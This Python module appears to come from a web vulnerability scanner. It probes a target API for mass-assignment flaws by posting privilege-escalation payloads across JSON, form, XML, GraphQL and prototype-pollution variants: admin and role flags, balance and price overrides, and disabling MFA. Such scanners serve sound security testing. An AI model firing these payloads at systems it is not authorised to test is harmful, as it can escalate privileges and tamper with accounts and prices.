"""Mass assignment / overposting — test for parameter overwriting in APIs, privilege escalation."""

import httpx
from .http_guard import GuardedAsyncClient
import urllib.parse
import re
import asyncio
import json


PRIVILEGE_PARAMS = [
    ("admin", "true"),
    ("is_admin", "true"),
    ("role", "admin"),
    ("user_id", "1"),
    ("account_type", "admin"),
    ("verified", "true"),
    ("email_verified", "true"),
    ("balance", "999999"),
    ("credit", "999999"),
    ("credits", "999999"),
    ("permissions", "admin"),
    ("group", "admin"),
    ("level", "99"),
    ("status", "active"),
    ("superuser", "true"),
    ("moderator", "true"),
    ("staff", "true"),
    ("is_superuser", "true"),
    ("is_staff", "true"),
    ("is_active", "true"),
    ("user_type", "admin"),
    ("account_status", "premium"),
    ("subscription", "enterprise"),
    ("plan", "unlimited"),
    ("quota", "999999"),
    ("discount", "100"),
    ("price", "0"),
    ("amount", "999999"),
    ("total", "0"),
    ("tax_exempt", "true"),
    ("approved", "true"),
    ("confirmed", "true"),
    ("activated", "true"),
    ("banned", "false"),
    ("suspended", "false"),
    ("locked", "false"),
    ("mfa_enabled", "false"),
    ("internal", "true"),
    ("debug", "true"),
    ("test_mode", "true"),
    ("_method", "PUT"),
    ("__proto__", '{"admin":true}'),
    ("constructor", '{"prototype":{"isAdmin":true}}'),
]

NESTED_PARAMS = [
    ("user[admin]", "true"),
    ("user[role]", "admin"),
    ("user[is_admin]", "true"),
    ("user[permissions]", "admin"),
    ("user[account_type]", "admin"),
    ("profile[role]", "admin"),
    ("profile[is_admin]", "true"),
    ("account[admin]", "true"),
    ("account[role]", "admin"),
    ("account[verified]", "true"),
    ("data[admin]", "true"),
    ("data[role]", "admin"),
    ("params[admin]", "true"),
    ("params[role]", "admin"),
    ("input[admin]", "true"),
    ("input[role]", "admin"),
    ("body[admin]", "true"),
    ("body[role]", "admin"),
    ("attrs[admin]", "true"),
    ("attrs[role]", "admin"),
]

ARRAY_PARAMS = [
    ("roles[]", "admin"),
    ("roles[]", "superadmin"),
    ("permissions[]", "admin"),
    ("groups[]", "admin"),
    ("groups[]", "wheel"),
    ("user_roles[]", "admin"),
    ("access[]", "admin"),
    ("scopes[]", "admin"),
    ("claims[]", "admin"),
]

JSON_NESTED_OBJECTS = [
    {"user": {"admin": True, "role": "admin"}},
    {"user": {"is_admin": True, "permissions": ["admin"]}},
    {"profile": {"role": "admin", "verified": True}},
    {"account": {"type": "admin", "status": "active"}},
    {"data": {"admin": True, "superuser": True}},
    {"attrs": {"role": "admin", "level": 99}},
    {"meta": {"admin": True, "internal": True}},
    {"settings": {"role": "admin", "permissions": "all"}},
    {"object": {"__proto__": {"admin": True}}},
    {"constructor": {"prototype": {"isAdmin": True}}},
]

GRAPHQL_MUTATIONS = [
    '{"query":"mutation{updateUser(input:{admin:true,role:\"admin\"}){id,role,admin}}"}',
    '{"query":"mutation{updateProfile(input:{is_admin:true,permissions:\"admin\"}){id,role}}"}',
    '{"query":"mutation{updateAccount(input:{type:\"admin\",verified:true}){id,type}}"}',
    '{"query":"mutation{changeRole(userId:1,role:\"admin\"){id,role}}"}',
    '{"query":"mutation{setPermissions(userId:1,permissions:[\"admin\"]){id,permissions}}"}',
    '{"query":"mutation{updateUser(id:1,input:{superuser:true}){id,superuser}}"}',
    '{"query":"mutation{promoteUser(userId:1,role:\"superadmin\"){id,role}}"}',
    '{"query":"mutation{updateUser(id:1,input:{admin:true,balance:999999}){id,admin,balance}}"}',
]

CONTENT_TYPES = [
    "application/json",
    "application/x-www-form-urlencoded",
    "application/xml",
    "multipart/form-data",
]

PRIVILEGE_INDICATORS = [
    "admin", "role", "superuser", "moderator", "staff",
    "permissions", "level", "type", "status", "verified",
    "balance", "credit", "quota", "plan", "subscription",
]

NORMAL_FIELDS = [
    {"name": "test_user", "email": "test@test.com", "password": "test123"},
    {"username": "test_user", "email": "test@test.com", "password": "test123"},
    {"user": {"name": "test", "email": "test@test.com"}},
]


def _compare_responses(baseline: dict, candidate: dict) -> dict:
    """Compare baseline and candidate responses for mass assignment indicators."""
    indicators = []
    if baseline["status"] != candidate["status"]:
        indicators.append(f"Status changed: {baseline['status']} -> {candidate['status']}")
    size_diff = abs(baseline["size"] - candidate["size"])
    if size_diff > 30:
        indicators.append(f"Size difference: {size_diff} bytes")
    try:
        b_json = json.loads(baseline["body"])
        c_json = json.loads(candidate["body"])
        if isinstance(b_json, dict) and isinstance(c_json, dict):
            for key in c_json:
                if key not in b_json:
                    indicators.append(f"New field in response: '{key}'")
                elif b_json[key] != c_json[key]:
                    indicators.append(f"Field changed: '{key}': {b_json[key]} -> {c_json[key]}")
            for key in c_json:
                val = str(c_json[key]).lower()
                if any(priv in val for priv in ["admin", "true", "999999", "superuser"]):
                    indicators.append(f"Privilege field set: '{key}' = {c_json[key]}")
    except (json.JSONDecodeError, TypeError):
        pass
    lower = candidate["body"].lower()
    for indicator in PRIVILEGE_INDICATORS:
        if indicator in lower and indicator not in baseline["body"].lower():
            indicators.append(f"Privilege indicator in response: '{indicator}'")
    return {
        "indicators": indicators,
        "vulnerable": len(indicators) > 0,
        "severity": "CRITICAL" if any("admin" in i.lower() or "superuser" in i.lower() for i in indicators) else "HIGH" if indicators else "NONE",
    }


def _detect_mass_assignment_framework(body: str, headers: dict) -> str:
    """Detect framework that might be vulnerable to mass assignment."""
    lower = body.lower()
    header_str = " ".join(f"{k}: {v}" for k, v in headers.items()).lower()
    combined = lower + " " + header_str
    frameworks = {
        "Ruby on Rails": ["rails", "ruby", "_csrf_token", "authenticity_token", "x-csrf-token"],
        "Laravel": ["laravel", "php", "csrf-token", "laravel_session"],
        "Django": ["django", "csrfmiddlewaretoken", "__all__", "csrf_token"],
        "Spring": ["spring", "java", "whitelabel", "_csrf"],
        "Express.js": ["express", "node", "x-powered-by: express"],
        "ASP.NET": ["asp.net", "viewstate", "__viewstate", "x-aspnet"],
        "Phoenix": ["phoenix", "elixir", "_csrf_token"],
    }
    for framework, signatures in frameworks.items():
        if any(sig in combined for sig in signatures):
            return framework
    return "Unknown"


async def mass_assignment(target: str) -> dict:
    """Mass assignment / overposting testing — test for parameter overwriting, privilege escalation, nested objects, arrays, GraphQL mutations."""
    if not target.startswith(("http://", "https://")):
        target = f"https://{target}"

    parsed = urllib.parse.urlparse(target)
    base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    results = []
    framework = "Unknown"

    async with GuardedAsyncClient(timeout=12.0, verify=False, follow_redirects=True) as client:
        # Get baseline
        baseline = {"status": 0, "size": 0, "body": "", "headers": {}}
        try:
            resp = await client.get(target)
            baseline = {
                "status": resp.status_code,
                "size": len(resp.text),
                "body": resp.text,
                "headers": dict(resp.headers),
            }
            framework = _detect_mass_assignment_framework(resp.text, dict(resp.headers))
        except Exception:
            pass

        # Get a POST baseline with normal data
        post_baseline = {"status": 0, "size": 0, "body": "", "headers": {}}
        normal_data = NORMAL_FIELDS[0]
        try:
            resp = await client.post(target, json=normal_data, headers={"Content-Type": "application/json"})
            post_baseline = {
                "status": resp.status_code,
                "size": len(resp.text),
                "body": resp.text,
                "headers": dict(resp.headers),
            }
        except Exception:
            pass

        # --- Test 1: JSON body with privilege params ---
        for param_name, param_value in PRIVILEGE_PARAMS:
            try:
                data = {"name": "test", "email": "test@test.com"}
                data[param_name] = param_value
                headers = {"Content-Type": "application/json"}
                resp = await client.post(target, json=data, headers=headers)
                candidate = {
                    "status": resp.status_code,
                    "size": len(resp.text),
                    "body": resp.text,
                }
                comparison = _compare_responses(post_baseline, candidate)
                if comparison["vulnerable"]:
                    results.append({
                        "technique": "json_param_overwrite",
                        "param": param_name,
                        "value": param_value,
                        "comparison": comparison,
                        "framework": framework,
                        "status": resp.status_code,
                        "risk": comparison["severity"],
                        "confidence": "high",
                    })
            except Exception:
                continue

        # --- Test 2: Form data with privilege params ---
        for param_name, param_value in PRIVILEGE_PARAMS[:20]:
            try:
                data = {"name": "test", "email": "test@test.com", param_name: param_value}
                resp = await client.post(target, data=data)
                candidate = {
                    "status": resp.status_code,
                    "size": len(resp.text),
                    "body": resp.text,
                }
                comparison = _compare_responses(post_baseline, candidate)
                if comparison["vulnerable"]:
                    results.append({
                        "technique": "form_param_overwrite",
                        "param": param_name,
                        "value": param_value,
                        "comparison": comparison,
                        "framework": framework,
                        "status": resp.status_code,
                        "risk": comparison["severity"],
                        "confidence": "high",
                    })
                    break
            except Exception:
                continue

        # --- Test 3: URL query parameters ---
        for param_name, param_value in PRIVILEGE_PARAMS[:15]:
            try:
                url = f"{base}?{urllib.parse.urlencode({param_name: param_value, 'name': 'test'})}"
                resp = await client.post(url, json={"name": "test", "email": "test@test.com"})
                candidate = {
                    "status": resp.status_code,
                    "size": len(resp.text),
                    "body": resp.text,
                }
                comparison = _compare_responses(post_baseline, candidate)
                if comparison["vulnerable"]:
                    results.append({
                        "technique": "query_param_overwrite",
                        "param": param_name,
                        "value": param_value,
                        "comparison": comparison,
                        "framework": framework,
                        "status": resp.status_code,
                        "risk": comparison["severity"],
                        "confidence": "high",
                    })
                    break
            except Exception:
                continue

        # --- Test 4: Nested object params ---
        for param_name, param_value in NESTED_PARAMS:
            try:
                data = {"name": "test", "email": "test@test.com", param_name: param_value}
                headers = {"Content-Type": "application/x-www-form-urlencoded"}
                resp = await client.post(target, data=data, headers=headers)
                candidate = {
                    "status": resp.status_code,
                    "size": len(resp.text),
                    "body": resp.text,
                }
                comparison = _compare_responses(post_baseline, candidate)
                if comparison["vulnerable"]:
                    results.append({
                        "technique": "nested_param_overwrite",
                        "param": param_name,
                        "value": param_value,
                        "comparison": comparison,
                        "framework": framework,
                        "status": resp.status_code,
                        "risk": comparison["severity"],
                        "confidence": "high",
                    })
                    break
            except Exception:
                continue

        # --- Test 5: Array params ---
        for param_name, param_value in ARRAY_PARAMS:
            try:
                data = {"name": "test", "email": "test@test.com", param_name: param_value}
                resp = await client.post(target, data=data)
                candidate = {
                    "status": resp.status_code,
                    "size": len(resp.text),
                    "body": resp.text,
                }
                comparison = _compare_responses(post_baseline, candidate)
                if comparison["vulnerable"]:
                    results.append({
                        "technique": "array_param_overwrite",
                        "param": param_name,
                        "value": param_value,
                        "comparison": comparison,
                        "framework": framework,
                        "status": resp.status_code,
                        "risk": comparison["severity"],
                        "confidence": "high",
                    })
                    break
            except Exception:
                continue

        # --- Test 6: JSON nested objects ---
        for idx, nested_data in enumerate(JSON_NESTED_OBJECTS):
            try:
                base_data = {"name": "test", "email": "test@test.com"}
                base_data.update(nested_data)
                headers = {"Content-Type": "application/json"}
                resp = await client.post(target, json=base_data, headers=headers)
                candidate = {
                    "status": resp.status_code,
                    "size": len(resp.text),
                    "body": resp.text,
                }
                comparison = _compare_responses(post_baseline, candidate)
                if comparison["vulnerable"]:
                    results.append({
                        "technique": "json_nested_overwrite",
                        "payload_index": idx,
                        "payload": nested_data,
                        "comparison": comparison,
                        "framework": framework,
                        "status": resp.status_code,
                        "risk": comparison["severity"],
                        "confidence": "high",
                    })
                    break
            except Exception:
                continue

        # --- Test 7: GraphQL mutations ---
        for mutation in GRAPHQL_MUTATIONS:
            try:
                headers = {"Content-Type": "application/json"}
                resp = await client.post(
                    f"{base}/graphql",
                    content=mutation,
                    headers=headers,
                )
                body = resp.text
                if resp.status_code == 200 and "data" in body:
                    lower = body.lower()
                    has_priv = any(ind in lower for ind in ["admin", "superuser", "role"])
                    if has_priv:
                        results.append({
                            "technique": "graphql_mass_assignment",
                            "mutation": mutation[:150],
                            "status": resp.status_code,
                            "evidence": body[:300],
                            "framework": framework,
                            "risk": "CRITICAL",
                            "confidence": "high",
                        })
                        break
            except Exception:
                continue

        # --- Test 8: XML body with privilege params ---
        xml_payloads = [
            '<user><name>test</name><email>test@test.com</email><admin>true</admin></user>',
            '<user><name>test</name><email>test@test.com</email><role>admin</role></user>',
            '<user><name>test</name><email>test@test.com</email><is_admin>true</is_admin></user>',
            '<user><name>test</name><email>test@test.com</email><superuser>true</superuser></user>',
            '<user><name>test</name><email>test@test.com</email><permissions>admin</permissions></user>',
        ]
        for xml_body in xml_payloads:
            try:
                headers = {"Content-Type": "application/xml"}
                resp = await client.post(target, content=xml_body, headers=headers)
                candidate = {
                    "status": resp.status_code,
                    "size": len(resp.text),
                    "body": resp.text,
                }
                comparison = _compare_responses(post_baseline, candidate)
                if comparison["vulnerable"]:
                    results.append({
                        "technique": "xml_mass_assignment",
                        "xml_body": xml_body[:150],
                        "comparison": comparison,
                        "framework": framework,
                        "status": resp.status_code,
                        "risk": comparison["severity"],
                        "confidence": "high",
                    })
                    break
            except Exception:
                continue

        # --- Test 9: HTTP method variation ---
        for method in ["PUT", "PATCH", "DELETE"]:
            for param_name, param_value in PRIVILEGE_PARAMS[:10]:
                try:
                    data = {"name": "test", "email": "test@test.com", param_name: param_value}
                    resp = await client.request(method, target, json=data, headers={"Content-Type": "application/json"})
                    candidate = {
                        "status": resp.status_code,
                        "size": len(resp.text),
                        "body": resp.text,
                    }
                    if resp.status_code not in (404, 405, 501):
                        comparison = _compare_responses(post_baseline, candidate)
                        if comparison["vulnerable"]:
                            results.append({
                                "technique": "method_mass_assignment",
                                "method": method,
                                "param": param_name,
                                "value": param_value,
                                "comparison": comparison,
                                "framework": framework,
                                "status": resp.status_code,
                                "risk": comparison["severity"],
                                "confidence": "high",
                            })
                            break
                except Exception:
                    continue

        # --- Test 10: API versioning (v1 vs v2) ---
        version_patterns = [("/api/v1/", "/api/v2/"), ("/v1/", "/v2/"), ("/api/", "/api/v2/")]
        for old_path, new_path in version_patterns:
            if old_path in base:
                new_base = base.replace(old_path, new_path)
                for param_name, param_value in PRIVILEGE_PARAMS[:10]:
                    try:
                        data = {"name": "test", "email": "test@test.com", param_name: param_value}
                        resp = await client.post(new_base, json=data, headers={"Content-Type": "application/json"})
                        candidate = {
                            "status": resp.status_code,
                            "size": len(resp.text),
                            "body": resp.text,
                        }
                        comparison = _compare_responses(post_baseline, candidate)
                        if comparison["vulnerable"]:
                            results.append({
                                "technique": "api_version_mass_assignment",
                                "old_version": old_path,
                                "new_version": new_path,
                                "param": param_name,
                                "comparison": comparison,
                                "framework": framework,
                                "status": resp.status_code,
                                "risk": comparison["severity"],
                                "confidence": "high",
                            })
                            break
                    except Exception:
                        continue

        # --- Test 11: Content-Type variation ---
        for ct in CONTENT_TYPES:
            for param_name, param_value in PRIVILEGE_PARAMS[:8]:
                try:
                    data = {"name": "test", "email": "test@test.com", param_name: param_value}
                    if ct == "application/x-www-form-urlencoded":
                        resp = await client.post(target, data=data, headers={"Content-Type": ct})
                    elif ct == "application/json":
                        resp = await client.post(target, json=data, headers={"Content-Type": ct})
                    elif ct == "application/xml":
                        xml = f"<data><name>test</name><email>test@test.com</email><{param_name}>{param_value}</{param_name}></data>"
                        resp = await client.post(target, content=xml, headers={"Content-Type": ct})
                    else:
                        continue

                    candidate = {
                        "status": resp.status_code,
                        "size": len(resp.text),
                        "body": resp.text,
                    }
                    comparison = _compare_responses(post_baseline, candidate)
                    if comparison["vulnerable"]:
                        results.append({
                            "technique": "content_type_mass_assignment",
                            "content_type": ct,
                            "param": param_name,
                            "comparison": comparison,
                            "framework": framework,
                            "status": resp.status_code,
                            "risk": comparison["severity"],
                            "confidence": "high",
                        })
                        break
                except Exception:
                    continue

        # --- Test 12: Prototype pollution via __proto__ ---
        proto_payloads = [
            {"__proto__": {"admin": True, "role": "admin"}},
            {"constructor": {"prototype": {"admin": True, "role": "admin"}}},
            {"__proto__": {"is_admin": True, "permissions": ["admin"]}},
            {"__proto__": {"balance": 999999, "credit": 999999}},
        ]
        for payload in proto_payloads:
            try:
                data = {"name": "test", "email": "test@test.com"}
                data.update(payload)
                headers = {"Content-Type": "application/json"}
                resp = await client.post(target, json=data, headers=headers)
                candidate = {
                    "status": resp.status_code,
                    "size": len(resp.text),
                    "body": resp.text,
                }
                comparison = _compare_responses(post_baseline, candidate)
                if comparison["vulnerable"]:
                    results.append({
                        "technique": "prototype_pollution",
                        "payload": payload,
                        "comparison": comparison,
                        "framework": framework,
                        "status": resp.status_code,
                        "risk": "CRITICAL",
                        "confidence": "high",
                    })
                    break
            except Exception:
                continue

    return {
        "target": target,
        "framework": framework,
        "results": results,
        "vulnerable": len(results) > 0,
        "total_findings": len(results),
        "techniques_found": list(set(r["technique"] for r in results)),
        "risk_summary": {
            "critical": sum(1 for r in results if r.get("risk") == "CRITICAL"),
            "high": sum(1 for r in results if r.get("risk") == "HIGH"),
            "medium": sum(1 for r in results if r.get("risk") == "MEDIUM"),
        },
    }
